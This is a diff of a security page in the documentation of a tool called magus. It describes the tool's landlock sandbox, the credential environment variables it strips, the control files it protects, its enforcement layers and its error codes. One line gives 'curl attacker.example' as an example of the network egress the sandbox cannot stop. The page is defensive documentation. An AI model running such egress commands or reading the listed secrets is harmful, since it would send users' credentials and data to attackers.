@@ -43,16 +43,22 @@ or extension reads credentials from disk and exfiltrates them.
   `AWS_*`, `GITHUB_TOKEN`, `VAULT_*`, `OP_SESSION_*`, `NPM_TOKEN`,
   `ANTHROPIC_API_KEY`, etc. By default only `HOME`, `PATH`, `USER`,
   locale vars, terminal vars, and `MAGUS_RUN_ID` pass through.
+- Writes through magus's bindings to files other tools run code from
+  later: `.git/hooks`, `.git/config`, `magus.yaml`, `mise.toml`,
+  `.envrc`, `.claude/` and the rest the
+  [sandbox model](../../../concepts/sandbox.md#control-files) lists.
 
 Without kernel landlock, only what goes through magus's own bindings is
 checked; see [MGS2005](MGS2005.md).
 
-## What sandbox does NOT block (v1)
+## What sandbox does NOT block
 
 - **Network egress.** A compromised spell with no token in its env can
   still `curl attacker.example`.
 - **In-memory secret theft from magus itself.** If magus is holding a
   secret in memory at the moment a spell runs, landlock cannot help.
+- **A child writing a control file.** Landlock cannot deny a path inside
+  a grant, so only magus's own bindings refuse those writes.
 
 ## Turning it on
 
@@ -72,8 +78,10 @@ magus --sandbox=required run build
 
 `best-effort` uses kernel landlock where the host has it and falls back
 to binding-level checks ([MGS2005](MGS2005.md)) where it does not.
-`required` refuses that fallback and stops with [MGS2012](MGS2012.md)
-instead. `off` is the default.
+`required` refuses that fallback, and a kernel below landlock ABI 3, and
+stops with [MGS2012](MGS2012.md) instead. `off` is the default. A nested
+magus inherits its parent's mode and may only strengthen it
+([MGS2010](MGS2010.md)).
 
 ## Extending the allowlist
 
@@ -103,15 +111,16 @@ everything that starts with `MISE_`. A bad entry is an error
 
 Two layers run together:
 
-1. **Kernel level.** On Linux 5.13 or newer, magus calls
-   `landlock_restrict_self` on itself before any spell code runs. The
-   restriction is inherited across `fork+exec`, so every child process
-   gets the same filesystem confinement automatically. No root required.
+1. **Kernel level.** On Linux 5.13 or newer, magus starts each child
+   through a launcher: magus re-executed, which applies the policy's
+   landlock ruleset to itself and then execs the command. The child and
+   everything it starts stay confined. magus itself is never confined.
+   No root required.
 2. **Binding level.** magus's own `fs`, `archive`, `crypto` and `http`
-   bindings check the policy before touching a path, and the exec
-   binding checks the binary it starts. This gives a friendly
-   `MGS2001`/`MGS2002`/`MGS2007` error and is the only enforcement on
-   macOS, Windows, or older Linux kernels.
+   bindings, and Buzz's own `os` and `io`, check the policy before
+   touching a path, and the exec binding checks the binary it starts.
+   This gives a friendly `MGS2001`/`MGS2002`/`MGS2007` error and is the
+   only enforcement on macOS, Windows, or older Linux kernels.
 
 ## Codes
 
@@ -123,8 +132,8 @@ Two layers run together:
 - [MGS2006](MGS2006.md): likely PATH-shim manager (mise/asdf/direnv) stripped.
 - [MGS2007](MGS2007.md): exec denied.
 - [MGS2008](MGS2008.md): server socket withheld from sandboxed children.
-- [MGS2010](MGS2010.md): sandbox policy mismatch (undeclared / fingerprint).
-- [MGS2012](MGS2012.md): the sandbox is required and the kernel is not enforcing it.
+- [MGS2010](MGS2010.md): a nested or forwarded run asked for a weaker sandbox mode.
+- [MGS2012](MGS2012.md): the sandbox is required and the kernel cannot confine the run's children.
 - [MGS3009](MGS3009.md): machine budget exhausted.
 - [MGS3010](MGS3010.md): redundant gate deferred.
 - [MGS3011](MGS3011.md): target exceeded its declared timeout.
